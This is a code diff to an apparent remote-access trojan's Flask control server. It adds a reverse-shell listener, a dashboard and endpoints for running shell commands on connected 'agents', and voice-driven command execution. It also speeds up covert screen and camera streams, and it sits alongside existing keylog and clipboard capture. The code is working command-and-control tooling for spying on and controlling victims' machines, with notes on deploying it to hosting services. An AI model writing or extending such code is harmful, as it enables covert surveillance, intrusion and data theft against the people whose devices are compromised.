@@ -6,6 +6,9 @@ import queue
 import os
 import base64
 import tempfile
+import socket
+import threading
+import json
 
 app = Flask(__name__)
 
@@ -28,6 +31,7 @@ DASHBOARD_HTML = """
             --accent-purple: #6c5ce7;
             --accent-green: #00ff88;
             --accent-red: #ff4757;
+            --accent-yellow: #feca57;
             --text-primary: #ffffff;
             --text-secondary: #a0a0a0;
             --border-color: #2d3748;
@@ -329,6 +333,12 @@ DASHBOARD_HTML = """
             border: 1px solid var(--accent-red);
         }
 
+        .status-pending {
+            background: rgba(255, 255, 0, 0.2);
+            color: var(--accent-yellow);
+            border: 1px solid var(--accent-yellow);
+        }
+
         .no-agents {
             text-align: center;
             padding: 40px 20px;
@@ -430,6 +440,30 @@ DASHBOARD_HTML = """
                         <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                         <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                     </div>
+
+                    <div class="control-group">
+                        <div class="control-header">Reverse Shell</div>
+                        <button class="btn" onclick="startReverseShell()">Start Reverse Shell</button>
+                        <button class="btn btn-danger" onclick="stopReverseShell()">Stop Reverse Shell</button>
+                        <div class="input-group">
+                            <label class="input-label">Shell Command</label>
+                            <input type="text" class="neural-input" id="shell-command" placeholder="Enter shell command...">
+                        </div>
+                        <button class="btn" onclick="executeShellCommand()">Execute Shell Command</button>
+                        <div id="shell-status" class="status-indicator"></div>
+                    </div>
+
+                    <div class="control-group">
+                        <div class="control-header">Voice Control</div>
+                        <button class="btn" onclick="startVoiceControl()">Start Voice Control</button>
+                        <button class="btn btn-danger" onclick="stopVoiceControl()">Stop Voice Control</button>
+                        <div id="voice-status" class="status-indicator"></div>
+                        <div class="voice-commands-info">
+                            <small style="color: var(--text-secondary);">
+                                Voice commands: "screenshot", "start camera", "stop camera", "start streaming", "stop streaming", "system info", "list processes", "current directory", "run [command]"
+                            </small>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -441,6 +475,15 @@ DASHBOARD_HTML = """
                 <div class="panel-title">Neural Terminal</div>
             </div>
             <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
+        </div>
+
+        <!-- Reverse Shell Terminal -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon">🐚</div>
+                <div class="panel-title">Reverse Shell Terminal</div>
+            </div>
+            <div class="output-terminal" id="shell-output-display">Reverse shell not connected. Start reverse shell to begin...</div>
         </div>
 
         <!-- Hidden audio player for streams -->
@@ -710,6 +753,133 @@ DASHBOARD_HTML = """
             issueCommand();
         }
 
+        // Reverse Shell Functions
+        async function startReverseShell() {
+            if (selectedAgentId) {
+                await issueCommandInternal(selectedAgentId, 'start-reverse-shell');
+                showStatus('Reverse shell started', 'success');
+                document.getElementById('shell-output-display').textContent = 'Reverse shell connecting...';
+            } else {
+                showStatus('Please select an agent first.', 'error');
+            }
+        }
+
+        async function stopReverseShell() {
+            if (selectedAgentId) {
+                await issueCommandInternal(selectedAgentId, 'stop-reverse-shell');
+                showStatus('Reverse shell stopped', 'success');
+                document.getElementById('shell-output-display').textContent = 'Reverse shell disconnected.';
+            } else {
+                showStatus('Please select an agent first.', 'error');
+            }
+        }
+
+        async function executeShellCommand() {
+            const command = document.getElementById('shell-command').value;
+            const statusDiv = document.getElementById('shell-status');
+            const outputDisplay = document.getElementById('shell-output-display');
+
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+
+            if (!command) {
+                showStatus('Please enter a shell command.', 'error');
+                return;
+            }
+
+            try {
+                statusDiv.style.display = 'block';
+                statusDiv.className = 'status-indicator status-pending';
+                statusDiv.textContent = 'Executing shell command...';
+
+                outputDisplay.textContent = 'Executing shell command... Please wait.';
+
+                const response = await fetch(`/reverse_shell/${selectedAgentId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: command })
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    statusDiv.className = 'status-indicator status-success';
+                    statusDiv.textContent = 'Shell command executed successfully';
+                    document.getElementById('shell-command').value = '';
+
+                    // Display the response in the shell terminal
+                    outputDisplay.textContent = result.response || '[No output]';
+                } else {
+                    statusDiv.className = 'status-indicator status-error';
+                    statusDiv.textContent = 'Shell command failed';
+                    outputDisplay.textContent = result.message || 'Shell command failed';
+                }
+
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 3000);
+
+            } catch (error) {
+                statusDiv.className = 'status-indicator status-error';
+                statusDiv.textContent = 'Network error. Could not execute shell command.';
+                outputDisplay.textContent = 'Network error occurred.';
+                console.error('Error executing shell command:', error);
+
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        // Voice Control Functions
+        async function startVoiceControl() {
+            if (selectedAgentId) {
+                await issueCommandInternal(selectedAgentId, 'start-voice-control');
+                showStatus('Voice control started - agent is now listening', 'success');
+                document.getElementById('voice-status').style.display = 'block';
+                document.getElementById('voice-status').className = 'status-indicator status-success';
+                document.getElementById('voice-status').textContent = 'Voice control active - speak your commands';
+            } else {
+                showStatus('Please select an agent first.', 'error');
+            }
+        }
+
+        async function stopVoiceControl() {
+            if (selectedAgentId) {
+                await issueCommandInternal(selectedAgentId, 'stop-voice-control');
+                showStatus('Voice control stopped', 'success');
+                document.getElementById('voice-status').style.display = 'block';
+                document.getElementById('voice-status').className = 'status-indicator status-error';
+                document.getElementById('voice-status').textContent = 'Voice control inactive';
+                
+                setTimeout(() => {
+                    document.getElementById('voice-status').style.display = 'none';
+                }, 3000);
+            } else {
+                showStatus('Please select an agent first.', 'error');
+            }
+        }
+
+        // Enhanced keyboard shortcuts
+        document.addEventListener('keydown', function(event) {
+            // Enter key in shell command input
+            if (event.target.id === 'shell-command' && event.key === 'Enter') {
+                executeShellCommand();
+            }
+            // Ctrl+Shift+S for reverse shell
+            if (event.ctrlKey && event.shiftKey && event.key === 'S') {
+                event.preventDefault();
+                startReverseShell();
+            }
+            // Ctrl+Shift+V for voice control
+            if (event.ctrlKey && event.shiftKey && event.key === 'V') {
+                event.preventDefault();
+                startVoiceControl();
+            }
+        });
+
         // Helper function to issue commands without showing status to the user (for internal tasks)
         async function issueCommandInternal(agentId, command) {
             if (!agentId) return;
@@ -754,6 +924,111 @@ AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 KEYLOG_DATA = defaultdict(lambda: [])
 CLIPBOARD_DATA = defaultdict(lambda: [])
 VOICE_COMMANDS = defaultdict(lambda: queue.Queue())
+
+# Reverse shell connections
+REVERSE_SHELL_CONNECTIONS = {}
+REVERSE_SHELL_SERVER = None
+REVERSE_SHELL_THREAD = None
+
+# --- Reverse Shell Server Functions ---
+
+def handle_reverse_shell_connection(client_socket, client_address):
+    """Handle individual reverse shell connections from agents."""
+    print(f"Reverse shell connection from {client_address}")
+    
+    try:
+        # Receive initial connection info
+        data = client_socket.recv(4096)
+        if data:
+            connection_info = json.loads(data.decode().strip())
+            agent_id = connection_info.get("agent_id")
+            
+            if agent_id:
+                REVERSE_SHELL_CONNECTIONS[agent_id] = {
+                    "socket": client_socket,
+                    "address": client_address,
+                    "info": connection_info,
+                    "connected_at": datetime.datetime.utcnow().isoformat()
+                }
+                print(f"Reverse shell registered for agent {agent_id}")
+                
+                # Keep connection alive and handle commands
+                while True:
+                    try:
+                        # Check if there are any shell commands to send
+                        if agent_id in REVERSE_SHELL_CONNECTIONS:
+                            # This would be integrated with a command queue system
+                            time.sleep(1)
+                        else:
+                            break
+                    except Exception as e:
+                        print(f"Error in reverse shell loop: {e}")
+                        break
+                        
+    except Exception as e:
+        print(f"Error handling reverse shell connection: {e}")
+    finally:
+        # Clean up connection
+        for agent_id, conn_info in list(REVERSE_SHELL_CONNECTIONS.items()):
+            if conn_info["socket"] == client_socket:
+                del REVERSE_SHELL_CONNECTIONS[agent_id]
+                print(f"Reverse shell disconnected for agent {agent_id}")
+                break
+        try:
+            client_socket.close()
+        except:
+            pass
+
+def start_reverse_shell_server():
+    """Start the reverse shell server."""
+    global REVERSE_SHELL_SERVER, REVERSE_SHELL_THREAD
+    
+    def server_thread():
+        global REVERSE_SHELL_SERVER
+        try:
+            REVERSE_SHELL_SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            REVERSE_SHELL_SERVER.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            REVERSE_SHELL_SERVER.bind(("0.0.0.0", 9999))
+            REVERSE_SHELL_SERVER.listen(5)
+            print("Reverse shell server listening on port 9999")
+            
+            while True:
+                try:
+                    client_socket, client_address = REVERSE_SHELL_SERVER.accept()
+                    # Handle each connection in a separate thread
+                    connection_thread = threading.Thread(
+                        target=handle_reverse_shell_connection,
+                        args=(client_socket, client_address)
+                    )
+                    connection_thread.daemon = True
+                    connection_thread.start()
+                except Exception as e:
+                    print(f"Error accepting reverse shell connection: {e}")
+                    break
+        except Exception as e:
+            print(f"Error starting reverse shell server: {e}")
+    
+    if not REVERSE_SHELL_THREAD:
+        REVERSE_SHELL_THREAD = threading.Thread(target=server_thread)
+        REVERSE_SHELL_THREAD.daemon = True
+        REVERSE_SHELL_THREAD.start()
+
+def send_shell_command(agent_id, command):
+    """Send a command to a specific agent's reverse shell."""
+    if agent_id in REVERSE_SHELL_CONNECTIONS:
+        try:
+            socket_conn = REVERSE_SHELL_CONNECTIONS[agent_id]["socket"]
+            socket_conn.send(command.encode() + b'\n')
+            
+            # Receive response
+            response = socket_conn.recv(4096).decode()
+            return response
+        except Exception as e:
+            print(f"Error sending shell command: {e}")
+            return f"Error: {e}"
+    else:
+        return "No reverse shell connection found for this agent"
+
 # --- Operator-facing endpoints ---
 
 @app.route("/")
@@ -806,9 +1081,9 @@ def stream_in(agent_id):
     return "OK", 200
 
 def generate_video_frames(agent_id):
-    """Generator function to stream video frames to the dashboard."""
+    """Generator function to stream video frames to the dashboard at high FPS."""
     while True:
-        time.sleep(0.05) # Yield frames at a consistent rate
+        time.sleep(0.033) # ~30 FPS (1/30 = 0.033)
         frame = VIDEO_FRAMES.get(agent_id)
         if frame:
             yield (b'--frame\r\n'
@@ -827,10 +1102,10 @@ def camera_in(agent_id):
     return "OK", 200
 
 def generate_camera_frames(agent_id):
-    """Generator function to stream camera frames to the dashboard."""
+    """Generator function to stream camera frames to the dashboard at high FPS."""
     last_frame_time = time.time()
     while True:
-        time.sleep(0.05)
+        time.sleep(0.033) # ~30 FPS (1/30 = 0.033)
         frame = CAMERA_FRAMES.get(agent_id)
         if frame:
             last_frame_time = time.time() # Reset timer on new frame
@@ -1060,6 +1335,45 @@ def send_voice():
     
     return jsonify({"status": "success", "message": "Voice command sent to agent"})
 
+@app.route("/voice_command/<agent_id>", methods=["POST"])
+def receive_voice_command(agent_id):
+    """Receive voice command from agent and execute it."""
+    data = request.json
+    command = data.get("command")
+    
+    if not command:
+        return jsonify({"status": "error", "message": "Command required"}), 400
+    
+    # Add the command to the agent's command queue
+    AGENTS_DATA[agent_id]["commands"].append(command)
+    
+    return jsonify({"status": "success", "message": f"Voice command '{command}' queued for execution"})
+
+@app.route("/reverse_shell/<agent_id>", methods=["POST"])
+def reverse_shell_command(agent_id):
+    """Send command to agent's reverse shell."""
+    data = request.json
+    command = data.get("command")
+    
+    if not command:
+        return jsonify({"status": "error", "message": "Command required"}), 400
+    
+    response = send_shell_command(agent_id, command)
+    return jsonify({"status": "success", "response": response})
+
+@app.route("/reverse_shell_status")
+def reverse_shell_status():
+    """Get status of all reverse shell connections."""
+    status = {}
+    for agent_id, conn_info in REVERSE_SHELL_CONNECTIONS.items():
+        status[agent_id] = {
+            "connected": True,
+            "address": conn_info["address"],
+            "connected_at": conn_info["connected_at"],
+            "info": conn_info["info"]
+        }
+    return jsonify(status)
+
 # --- Agent-facing endpoints ---
 
 @app.route("/get_task/<agent_id>", methods=["GET"])
@@ -1093,7 +1407,12 @@ def post_output(agent_id):
     return jsonify({"status": "output received"})
 
 if __name__ == "__main__":
+    # Start the reverse shell server
+    print("Starting reverse shell server...")
+    start_reverse_shell_server()
+    
     # For deployment on services like Render or Railway, they will use a production WSGI server.
     # The host '0.0.0.0' makes the server accessible externally.
     # IMPORTANT: debug=False is critical for security in a live environment.
+    print("Starting Flask web server on port 8080...")
     app.run(host="0.0.0.0", port=8080, debug=False)
